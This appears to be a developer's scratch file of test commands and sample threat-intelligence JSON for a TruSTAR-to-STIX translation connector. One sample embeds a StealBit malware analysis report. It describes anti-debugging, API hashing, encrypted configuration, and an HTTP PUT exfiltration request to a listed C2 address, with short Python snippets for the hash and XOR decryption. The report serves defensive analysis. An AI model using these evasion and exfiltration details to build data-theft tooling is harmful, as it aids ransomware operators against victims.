@@ -1,0 +1,555 @@
+
+TRANSLATE STIX QUERIES 
+-------------------------
+
+python main.py translate trustar query '{}' "[x-trustar:x_searchTerm = '9.43.57.250' AND x-trustar:x_type = 'IP'] START t'2021-08-28T12:54:01.009Z'" '{"validate_pattern": true}'
+
+python main.py translate trustar query '{}' "[x-trustar:x_searchTerm = '9.43.57.250' AND x-trustar:x_type = 'IP'] START t'2021-08-28T12:54:01.009Z'" '{"validate_pattern": true}'
+
+
+python main.py translate trustar query '{}' "[x-trustar:x_searchTerm = '']"
+
+python main.py translate trustar query '{}' "[x-trustar:x_type = 'IP, MALWARE']"
+
+python main.py translate trustar query '{}' "{\"reportId\": \"8db7a47a-df0d-4b83-98d2-2cc637c91ab5\", \"from\": 1630155241000, \"to\": 1630846441000}" 0 1
+
+
+-------------------------
+
+TRANSLATE TRUSTAR RESPONSE
+-------------------------
+python main.py translate trustar results '{"type": "identity","id": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff","name": "mysql","identity_class": "events"}' '[{
+    "id": "8db7a47a-df0d-4b83-98d2-2cc637c91ab5",
+    "created": 1631609463188,
+    "updated": 1631609463188,
+    "title": "StealBit Malware Profile",
+    "distributionType": "ENCLAVE",
+    "submissionStatus": "PROCESSED",
+    "timeBegan": 1631597436000,
+    "reportBody": "# Summary\n\nStealBit is a file transfer tool which is capable of automatically uploading a victim's data to a remote C2 server. StealBit is used to exfiltrate data from computers running Microsoft Windows as part of ransomware operations.\n\nStealBit will attempt to connect to a C2 server using a list of IP addresses contained in an encrypted configuration block within the StealBit executable file. StealBit will create multiple concurrent connections to the first server that it successfully connects to and begin transferring files to that C2 server. StealBit is executed with a list of files or directories as command line parameters that it should transfer to the C2 server. StealBit will recursively traverse any directories transferring any files contained within them. StealBit will compress files in order to transfer the data more efficiently.\n\n### Threat Type\n\n  * Hacker Tool\n\n\n\n### Threat Group\n\n  * Unknown\n\n\n\n# Analysis Details\n\nStealBit is a command line tool that runs on Windows systems. StealBit accepts one or more file names or directory names as input parameters that it will attempt to transfer to a threat actor controlled C2 server. StealBit will recursively traverse any directories that are provided and transfer any files contained within them.\n\n### Behavioral Analysis\n\nUpon execution, StealBit performs a basic check to determine if it is being debugged. It will check the value of 'NtGlobalFlag' in the Process Environment Block (PEB) structure and will enter an infinite loop if it is set to 0x70 which indicates it is being debugged. Otherwise, StealBit will continue operating normally.\n\nStealBit manually loads Windows dynamic-link libraries (DLLs) and identifies function addresses as needed prior to it executing them in order to impede analysis. The library names are encrypted, and the function addresses are found by computing a hash of each function name in a library then comparing to a specified hash for the targeted function. The hash algorithm used by StealBit is a modified version of the FNV1 algorithm.\n\nStealBit creates a named pipe **STEALBIT-MASTER-PIPE**. The named pipe is used to write output to a console window that is created to display status information of the file transfers. The title for the console window is set to **StealBit**. Status messages are written to the console with a timestamp generated from the computer's local time via a call to _GetLocalTime()_ and formatted as `[hh:mm:ss]`.\n\n![](/download/attachments/64127377/StealBit_scr1.png?version=1&modificationDate=1631189656281&api=v2)\n\nStealBit determines the computer and domain names for the compromised computer by calling _GetComputerNameExA()_. These are used in C2 communication to identify the system that files are being exfiltrated from.\n\nStealBit's configuration data is encrypted with a 16-byte rolling XOR key. The configuration data contains a five-character uppercase alpha-numeric code that appears to be used as a campaign or Bot ID (i.e., `LCPA0`). Also, contained in the configuration data are five IP addresses for C2 servers that StealBit may communicate with. StealBit will try to connect to each address until it successfully connects to one of them.\n\nStealBit uses the Windows Sockets 2 API (or Winsock) to communicate with its C2 server. StealBit displays the following string upon initializing Winsock: `[+] WinSock initialized`. StealBit creates multiple network connections to the first available C2 server using TCP port 80. The network connections remain open until StealBit has finished transferring all queued files. StealBit will create the connection even if no files are queued for transfer as it processes the command line parameters after creating the connections. StealBit will close all the connections after all files are transferred or if no files are queued.\n\nStealBit will display a status message upon attempting C2 connections:\n    \n    \n    [18:35:24] Connecting to 88.80.147.102\n    [18:35:24] Check server 88.80.14.102...\n    [18:35:24] [+] Server connected ...\n    \n\nEach file is transferred in the body of an HTTP PUT request as a binary stream of data. The body of the PUT request contains the following fields before the start of the file data:\n\n  * `DAV2` marker\n  * Campaign ID\n  * Domain and computer names\n  * Transferred file name and path\n\n\n\nThe following is an example of a file transfer request:\n    \n    \n    PUT /4A0947C5CA3597737E28EE32DA96B3A4 HTTP/1.1\n    Host:88.80.147.102\n    Content-type:application/octet-stream\n    Transfer-Encoding:chunked\n    \n    DAV2F.gI........+\"...,...C...,......LCPA0....*.NODOMAINWIN-9RQE8P14T0Em.y.t.e.s.t.d.i.r.\\.r.e.p.o.r.t...d.o.c.x..+PK..........!....lZ... .......[Content_Types].xml ...(..........L...n.0.E......Ub...*..>.-R...{.V........QU..\n    \n\nStealBit will display `+++ all operations complete! +++` after all file transfers are completed then cleanup network/IO connections and exit.\n\n### Anti-analysis\n\nStealBit uses multiple anti-analysis techniques to deter dynamic and static analysis including manually loading dynamic-linked libraries and API name hashing to obfuscate which library functions are used. StealBit encrypts all strings contained within it.\n\nStealBit uses string obfuscation to hide all strings including which Windows API DLLs are loaded. A separate function is executed to build an obfuscated string by using a combination of XOR and ADD operations to generate each character in the obfuscated string. Multiple functions are executed to perform the operations for each character. A string decoder function is executed to decode the string also using XOR and ADD operations executed via multiple functions. This process is used to create the deobfuscated string for each library file name. The base address for the 'kernel32.dll' library, that is automatically loaded into memory, is retrieved and used to search 'kernel32.dll' for the address for _LoadLibaryA()_ based on the hash of the function name. _LoadLibaryA()_ is called to load each library into memory.\n\nStealBit retrieves the address for each library function that StealBit will execute from the respective library similarly to how it retrieves the address for _LoadLibraryA()_ using a hash algorithm. The API hash algorithm used by StealBit is based on the FNV1 algorithm. The following is an implementation of the StealBit hash algorithm in Python:\n    \n    \n    def fnv1_stealbit(inString):\n        hash = 0x811c9dc5 # (32-bit offset_basis)\n        for c in inString:\n            c = ord(c)\n            val = c | 0x20\n            if (c - 65) > 0x19:\n                val = c\n            hash = (0x1000193 * (hash ^ val)) & 0xFFFFFFFF # 0x1000193 32-bit FNV_prime\n    \n        return hash\n    \n\n### Configuration Decryption\n\nThe StealBit configuration data is stored in a similar format and located at the same address in all analyzed samples making it easy to update the configuration data. The encrypted configuration data has a length of 124 bytes and starts at _0x40E2CB_. The data is decrypted using a 16-byte rolling XOR key that begins at address _0x40E240_. The encrypted data can be decrypted using the following Python code:\n    \n    \n    for i in range(0, enc_c2_block_size):\n        dec_c2_bytearray[i] = (enc_c2_block[i] ^ xor_key_block[i & 0xF]) & 0xFF\n    \n\n# Files\n\nFile Hash| File Category  \n---|---  \n3407f26b3d69f1dfce76782fee1256274cf92f744c65aa1ff2d3eaaaf61b0b1d| Tool  \nbd14872dd9fdead89fc074fdc5832caea4ceac02983ec41f814278130b3f943e| Tool  \n07a3dcb8d9b062fb480692fa33d12da05c21f544492cbaf9207956ac647ba9ae| Tool  \n4db7eeed852946803c16373a085c1bb5f79b60d2122d6fc9a2703714cdd9dac0| Tool  \n  \n## Related articles\n",
+    "externalTrackingId": "97a00d95e2ee29a070110a39b9c0b0e9",
+    "enclaveIds": [
+        "4c1e92f9-457e-42b2-bf99-c9178d95962b"
+    ],
+    "tags": [{
+            "guid": "stealbit",
+            "name": "stealbit",
+            "enclaveId": "4c1e92f9-457e-42b2-bf99-c9178d95962b"
+        },
+        {
+            "guid": "malware",
+            "name": "malware",
+            "enclaveId": "4c1e92f9-457e-42b2-bf99-c9178d95962b"
+        },
+        {
+            "guid": "confluence",
+            "name": "confluence",
+            "enclaveId": "4c1e92f9-457e-42b2-bf99-c9178d95962b"
+        },
+        {
+            "guid": "sherlock",
+            "name": "sherlock",
+            "enclaveId": "4c1e92f9-457e-42b2-bf99-c9178d95962b"
+        }
+    ],
+    "indicators": [{
+            "indicatorType": "SOFTWARE",
+            "value": "/download/attachments/64127377/stealbit_scr1.png",
+            "guid": "SOFTWARE|/download/attachments/64127377/stealbit_scr1.png"
+        },
+        {
+            "indicatorType": "SHA256",
+            "value": "07a3dcb8d9b062fb480692fa33d12da05c21f544492cbaf9207956ac647ba9ae",
+            "guid": "SHA256|07a3dcb8d9b062fb480692fa33d12da05c21f544492cbaf9207956ac647ba9ae"
+        },
+        {
+            "indicatorType": "SHA256",
+            "value": "3407f26b3d69f1dfce76782fee1256274cf92f744c65aa1ff2d3eaaaf61b0b1d",
+            "guid": "SHA256|3407f26b3d69f1dfce76782fee1256274cf92f744c65aa1ff2d3eaaaf61b0b1d"
+        },
+        {
+            "indicatorType": "MD5",
+            "value": "4a0947c5ca3597737e28ee32da96b3a4",
+            "guid": "MD5|4a0947c5ca3597737e28ee32da96b3a4"
+        },
+        {
+            "indicatorType": "SHA256",
+            "value": "4db7eeed852946803c16373a085c1bb5f79b60d2122d6fc9a2703714cdd9dac0",
+            "guid": "SHA256|4db7eeed852946803c16373a085c1bb5f79b60d2122d6fc9a2703714cdd9dac0"
+        },
+        {
+            "indicatorType": "IP",
+            "value": "88.80.14.102",
+            "guid": "IP|88.80.14.102"
+        },
+        {
+            "indicatorType": "IP",
+            "value": "88.80.147.102",
+            "guid": "IP|88.80.147.102"
+        },
+        {
+            "indicatorType": "SHA256",
+            "value": "bd14872dd9fdead89fc074fdc5832caea4ceac02983ec41f814278130b3f943e",
+            "guid": "SHA256|bd14872dd9fdead89fc074fdc5832caea4ceac02983ec41f814278130b3f943e"
+        },
+        {
+            "indicatorType": "SOFTWARE",
+            "value": "content_types].xml",
+            "guid": "SOFTWARE|content_types].xml"
+        },
+        {
+            "indicatorType": "URL",
+            "value": "dav2f.gi",
+            "guid": "URL|dav2f.gi"
+        },
+        {
+            "indicatorType": "SOFTWARE",
+            "value": "kernel32.dll",
+            "guid": "SOFTWARE|kernel32.dll"
+        },
+        {
+            "indicatorType": "SOFTWARE",
+            "value": "nodomainwin-9rqe8p14t0em.y.t.e.s.t.d.i.r",
+            "guid": "SOFTWARE|nodomainwin-9rqe8p14t0em.y.t.e.s.t.d.i.r"
+        },
+        {
+            "indicatorType": "SOFTWARE",
+            "value": "r.e.p.o.r.t...d.o.c",
+            "guid": "SOFTWARE|r.e.p.o.r.t...d.o.c"
+        }
+    ]
+}]'
+'{"stix_validator":true}'
+
+
+
+INITIAL VIEW 
+{
+         "indicatorType":"IP",
+         "value":"172.68.11.219",
+         "priorityLevel":"NOT_FOUND",
+         "guid":"IP|172.68.11.219",
+         "firstSeen": 1610726516000,
+         "lastSeen": 1623772916000
+},
+{
+            "reportId": "1af288dc-9479-44ca-8ea1-b25bcaa961e3",
+            "updated": 1565074288021,
+            "enclaveId": "fdb4676c-1e02-47ad-b19a-24e5867c5485",
+            "source": {
+                "key": "crowdstrike_indicator",
+                "name": "CrowdStrike"
+            },
+            "type": "IP",
+            "value": "172.68.11.219",
+            "score": {
+                "name": "Malicious Confidence",
+                "value": "low"
+            },
+            "attributes": [
+                {
+                    "name": "IP Address Types",
+                    "value": [
+                        "TorProxy"
+                    ]
+                },
+                {
+                    "name": "Indicator Type",
+                    "value": "ip_address"
+                },
+                {
+                    "name": "Relations Count",
+                    "value": 0
+                }
+            ]
+        }
+MODIFIED VIEW 
+
+{
+         "IP":"172.68.11.219",
+         "priorityLevel":"NOT_FOUND",
+         "guid":"IP|172.68.11.219",
+         "firstSeen": 1610726516000,
+         "lastSeen": 1623772916000,
+         "x-trustar-reports-details": [
+            {
+            "reportId": "1af288dc-9479-44ca-8ea1-b25bcaa961e3",
+            "updated": 1565074288021,
+            "enclaveId": "fdb4676c-1e02-47ad-b19a-24e5867c5485",
+            "source": {
+                "crowdstrike_indicator": "CrowdStrike"
+            },
+            }
+         ]
+}
+
+-------------------------
+python main.py translate trustar results '{"type": "identity", "id": "identity--sdf3dsdf-afwezcd-sfds-ssdfs", "name": "Trustar", "identity_class": "events"}'  '[{
+       "IP": "172.68.11.219",
+       "attributes2": {
+        "IP Address Types": [
+             "TorProxy"
+         ],
+         "Indicator Type": "ip_address",
+         "Relations Count": 0     
+     }},
+     {       
+         "IP": "172.68.11.219",
+       "attributes2": {
+        "IP Address Types": [
+             "TorProxy"
+         ],
+         "Indicator Type": "ip_address",
+         "Relations Count": 0     
+     }
+}]' '{"stix_validator":true}'
+----------------------
+python main.py translate trustar results '{"type": "identity", "id": "identity--sdf3dsdf-afwezcd-sfds-ssdfs", "name": "Trustar", "identity_class": "events"}'  '[{
+                    {
+                       "name": "IP Address Types",
+                        "value": [
+                        "TorProxy"
+                    ]
+                    },
+                    {
+                        "name": "Indicator Type",
+                        "value": "ip_address"
+                    },
+                    {
+                        "name": "Relations Count",
+                        "value": 0
+                    }
+}]' '{"stix_validator":true}'
+
+-----------------------------'
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--sdf3dsdf-afwezcd-sfds-ssdfs", "name": "Trustar", "identity_class": "events"}'  '[{'indicatorType': 'SHA256', 'value': '1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd', 'priorityLevel': 'NOT_FOUND', 'firstSeen': 1631686463006, 'lastSeen': 1631686463006, 'guid': 'SHA256|1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd', 'SHA256': '1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd', 'reports': [{'id': '7c4f8e95-7c3a-46f7-ab8f-1c9214f1a8b6', 'created': 1631686463005, 'updated': 1631686463005, 'title': 'XFTI_mal_LockFile.yar', 'distributionType': 'ENCLAVE', 'enclaveIds': ['a4f3bf67-459e-4332-9483-8f3cd30b515e']}], 'indicatorSummary': [], 'meta': {'indicatorType': 'SHA256', 'value': '1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd', 'correlationCount': 0, 'priorityLevel': 'NOT_FOUND', 'noteCount': 0, 'sightings': 1, 'firstSeen': 1631686463006, 'lastSeen': 1631686463006, 'enclaveIds': ['a4f3bf67-459e-4332-9483-8f3cd30b515e'], 'tags': [], 'source': '', 'notes': [], 'guid': 'SHA256|1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd'}}]' '{"stix_validator":true}'
+
+
+------------------------
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--sdf3dsdf-afwezcd-sfds-ssdfs", "name": "Trustar", "identity_class": "events"}'  '[
+{
+
+"IP":"172.68.11.219",
+    "priorityLevel": "NOT_FOUND",
+    "guid": "IP|172.68.11.219",
+    "firstSeen": 1610726516000,
+    "lastSeen": 1623772916000,
+​
+    "reportId": "1af288dc-9479-44ca-8ea1-b25bcaa961e3",
+    "updated": 1565074288021,
+    "enclaveId": "fdb4676c-1e02-47ad-b19a-24e5867c5485",
+    "source": {
+      "key": "crowdstrike_indicator",
+      "name": "CrowdStrike"
+    },
+    "score": {
+      "name": "Malicious Confidence",
+      "value": "low"
+    }
+}
+]' '{"stix_validator":true}'
+
+
+    "attributes": [{
+        "name": "IP Address Types",
+        "value": [
+          "TorProxy"
+        ]
+      },
+      {
+        "name": "Indicator Type",
+        "value": "ip_address"
+      },
+      {
+        "name": "Relations Count",
+        "value": 0
+      }
+    ],
+    "id": "00618551-1924-431d-8e05-ca8eeeec2dcb",
+    "created": 1517561071043,
+    "updated": 1517561080713,
+    "title": "IP by malware",
+    "distributionType": "ENCLAVE",
+    "timeBegan": 1517561071028,
+    "reportBody": null,
+    "enclaveIds": [
+        "012858f0-264b-11e8-b467-0ed5f89f718b"
+    ]
+
+--------------------
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--afwezcd-sfds-ssdfs-asdfsd3-asdf313", "name": "Trustar", "identity_class": "finding"}'  '[{
+    "IP": "172.68.11.219",
+    "priorityLevel":"NOT_FOUND",
+    "guid":"IP|172.68.11.219",
+    "firstSeen": 1610726516000,
+    "lastSeen": 1623772916000,
+    "reportId": "1af288dc-9479-44ca-8ea1-b25bcaa961e3",
+    "updated": 1565074288021,
+    "enclaveId": "fdb4676c-1e02-47ad-b19a-24e5867c5485",
+    "source": {
+      "key": "crowdstrike_indicator",
+      "name": "CrowdStrike"
+    },
+    "score": {
+      "name": "Malicious Confidence",
+      "value": "low"
+    },
+    "attributes": [
+                    {
+                       "name": "IP Address Types",
+                        "value": [
+                        "TorProxy"
+                    ]
+                    },
+                    {
+                        "name": "Indicator Type",
+                        "value": "ip_address"
+                    },
+                    {
+                        "name": "Relations Count",
+                        "value": 0
+                    }
+    ],
+    "id": "00618551-1924-431d-8e05-ca8eeeec2dcb",
+    "created": 1517561071043,
+    "updated": 1517561080713,
+    "title": "IP by malware",
+    "distributionType": "ENCLAVE",
+    "timeBegan": 1517561071028,
+    "reportBody": null,
+    "enclaveIds": [
+        "012858f0-264b-11e8-b467-0ed5f89f718b"
+    ]
+}]' '{"stix_validator":true}'
+
+-----------------------------------
+
+python main.py translate trustar_sync results '{"type": "identity", "id": "identity--afwezcd-sfds-ssdfs-asdfsd3-asdf313", "name": "Trustar", "identity_class": "finding"}'  '[{
+            "indicatorType": "IP",
+            "value": "9.30.44.3",
+            "priorityLevel": "NOT_FOUND",
+            "firstSeen": 1630071439159,
+            "lastSeen": 1630321684929,
+            "guid": "IP|9.30.44.3",
+            "IP": "9.30.44.3",
+            "indicatorSummary": {
+                 "reportId": "1af288dc-9479-44ca-8ea1-b25bcaa961e3",
+    "updated": 1565074288021,
+    "enclaveId": "fdb4676c-1e02-47ad-b19a-24e5867c5485",
+    "source": {
+      "key": "crowdstrike_indicator",
+      "name": "CrowdStrike"
+    },
+    "score": {
+      "name": "Malicious Confidence",
+      "value": "low"
+    },
+    "attributes": [
+                    {
+                       "name": "IP Address Types",
+                        "value": [
+                        "TorProxy"
+                    ]
+                    },
+                    {
+                        "name": "Indicator Type",
+                        "value": "ip_address"
+                    },
+                    {
+                        "name": "Relations Count",
+                        "value": 0
+                    }
+    ]
+            },
+            "reports": [
+                {
+                    "id": "3e17c2cd-bf6c-4808-8b08-573a9f1c8ddd",
+                    "created": 1630071602240,
+                    "updated": 1630321684919,
+                    "title": "Asset Details-Qradar",
+                    "distributionType": "ENCLAVE",
+                    "enclaveIds": [
+                        "7c42062e-060d-430d-9dcb-9a28031f71c4"
+                    ]
+                }
+            ]
+
+}]' '{"stix_validator":true}'
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--afwezcd-sfds-ssdfs-asdfsd3-asdf313", "name": "Trustar", "identity_class": "finding"}'  '[
+                {
+                    "indicatorType": "IP",
+                    "value": "9.43.57.250",
+                    "priorityLevel": "NOT_FOUND",
+                    "firstSeen": 1630577472536,
+                    "lastSeen": 1630577472536,
+                    "guid": "IP|9.43.57.250",
+                    "IP": "9.43.57.250",
+                    "indicatorSummary": {
+                 "reportId": "1af288dc-9479-44ca-8ea1-b25bcaa961e3",
+    "updated": 1565074288021,
+    "enclaveId": "fdb4676c-1e02-47ad-b19a-24e5867c5485",
+    "source": {
+      "key": "crowdstrike_indicator",
+      "name": "CrowdStrike"
+    },
+    "score": {
+      "name": "Malicious Confidence",
+      "value": "low"
+    },
+    "attributes": [
+                    {
+                       "name": "IP Address Types",
+                        "value": [
+                        "TorProxy"
+                    ]
+                    },
+                    {
+                        "name": "Indicator Type",
+                        "value": "ip_address"
+                    },
+                    {
+                        "name": "Relations Count",
+                        "value": 0
+                    }
+    ]
+            },
+                    "reports": [
+                        {
+                            "id": "a5e5895f-c1e9-4a80-9b1f-dabc4581e051",
+                            "created": 1630577472499,
+                            "updated": 1630577472499,
+                            "title": "QRadar Authention Report",
+                            "distributionType": "ENCLAVE",
+                            "enclaveIds": [
+                                "df82c00f-ec71-4910-8c1e-747292981571"
+                            ]
+                        },
+                        {
+                            "id": "3e17c2cd-bf6c-4808-8b08-573a9f1c8ddd",
+                            "created": 1630071602240,
+                            "updated": 1630321684919,
+                            "title": "Asset Details-Qradar",
+                            "distributionType": "ENCLAVE",
+                            "enclaveIds": [
+                                "7c42062e-060d-430d-9dcb-9a28031f71c4"
+                            ]
+                }
+                        
+                    ]
+                }
+            ]' '{"stix_validator":true}'
+
+
+----------------------
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--afwezcd-sfds-ssdfs-asdfsd3-asdf313", "name": "Trustar", "identity_class": "finding"}'  '[{
+"reports": [
+                {
+                    "id": "a5e5895f-c1e9-4a80-9b1f-dabc4581e051",
+                    "created": 1630577472499,
+                    "updated": 1630577472499,
+                    "title": "QRadar Authention Report",
+                    "distributionType": "ENCLAVE",
+                    "enclaveIds": [
+                        "df82c00f-ec71-4910-8c1e-747292981571"
+                    ]
+                }
+            ],
+"indicatorType": "IP",
+            "value": "9.43.120.130",
+            "priorityLevel": "NOT_FOUND",
+            "firstSeen": 1630577472500,
+            "lastSeen": 1630577472500,
+            "guid": "IP|9.43.120.130",
+            "IP": "9.43.120.130",
+            "indicatorSummary": []
+            
+}
+
+
+            ]' '{"stix_validator":true}'
+
+
+---------------------------------
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--afwezcd-sfds-ssdfs-asdfsd3-asdf313", "name": "Trustar", "identity_class": "finding"}'  '[{
+    "indicatorType": "IP",
+            "value": "9.30.116.81",
+            "priorityLevel": "NOT_FOUND",
+            "firstSeen": 1630071439159,
+            "lastSeen": 1630588132716,
+            "guid": "IP|9.30.116.81",
+            "IP": "9.30.116.81",
+            "reports": [
+                {
+                    "id": "9ca88e1d-bd3c-412d-9e34-8db32dcc5540",
+                    "created": 1630588132711,
+                    "updated": 1630588132711,
+                    "title": "QRadar Vulnerability Report",
+                    "distributionType": "ENCLAVE",
+                    "enclaveIds": [
+                        "46d916e1-4e40-469d-b3df-d3b1d706a28d"
+                    ]
+                },
+                {
+                    "id": "a5e5895f-c1e9-4a80-9b1f-dabc4581e051",
+                    "created": 1630577472499,
+                    "updated": 1630577472499,
+                    "title": "QRadar Authention Report",
+                    "distributionType": "ENCLAVE",
+                    "enclaveIds": [
+                        "df82c00f-ec71-4910-8c1e-747292981571"
+                    ]
+                },
+                {
+                    "id": "3e17c2cd-bf6c-4808-8b08-573a9f1c8ddd",
+                    "created": 1630071602240,
+                    "updated": 1630321684919,
+                    "title": "Asset Details-Qradar",
+                    "distributionType": "ENCLAVE",
+                    "enclaveIds": [
+                        "7c42062e-060d-430d-9dcb-9a28031f71c4"
+                    ]
+                }
+            ],
+            "indicatorSummary": [],
+            "meta": {
+                "indicatorType": "IP",
+                "value": "9.30.116.81",
+                "correlationCount": 0,
+                "priorityLevel": "NOT_FOUND",
+                "noteCount": 0,
+                "sightings": 5,
+                "firstSeen": 1630071439159,
+                "lastSeen": 1630588132716,
+                "enclaveIds": [
+                    "46d916e1-4e40-469d-b3df-d3b1d706a28d",
+                    "7c42062e-060d-430d-9dcb-9a28031f71c4",
+                    "df82c00f-ec71-4910-8c1e-747292981571"
+                ],
+                "tags": [
+                    {
+                        "guid": "119431b6-e75b-49fc-af8f-a87bdca93f8c",
+                        "name": "offensetag2",
+                        "enclaveId": "df82c00f-ec71-4910-8c1e-747292981571"
+                    },
+                    {
+                        "guid": "ec53d371-3ff9-4cbd-87b8-907070a8bafd",
+                        "name": "vatag1",
+                        "enclaveId": "46d916e1-4e40-469d-b3df-d3b1d706a28d"
+                    }
+                ],
+                "source": "",
+                "notes": [],
+                "guid": "IP|9.30.116.81"
+            }
+
+}]' '{"stix_validator":true}'
+
+
+python main.py translate trustar results '{"type": "identity", "id": "identity--afwezcd-sfds-ssdfs-asdfsd3-asdf313", "name": "Trustar", "identity_class": "finding"}'  '[{"indicatorType": "SHA256", "value": "1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd", "priorityLevel": "NOT_FOUND", "firstSeen": 1631686463006, "lastSeen": 1631686463006, "guid": "SHA256|1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd", "SHA256": "1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd", "reports": [{"id": "7c4f8e95-7c3a-46f7-ab8f-1c9214f1a8b6", "created": 1631686463005, "updated": 1631686463005, "title": "XFTI_mal_LockFile.yar", "distributionType": "ENCLAVE", "enclaveIds": ["a4f3bf67-459e-4332-9483-8f3cd30b515e"]}], "indicatorSummary": [], "meta": {"indicatorType": "SHA256", "value": "1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd", "correlationCount": 0, "priorityLevel": "NOT_FOUND", "noteCount": 0, "sightings": 1, "firstSeen": 1631686463006, "lastSeen": 1631686463006, "enclaveIds": ["a4f3bf67-459e-4332-9483-8f3cd30b515e"], "tags": [], "source": "", "notes": [], "guid": "SHA256|1d7047ac4a903a4ac0e4587ddb361cb3d17cae2d8f5e8286151587a9b013fcdd"}}]' '{"stix_validator":true}'
+
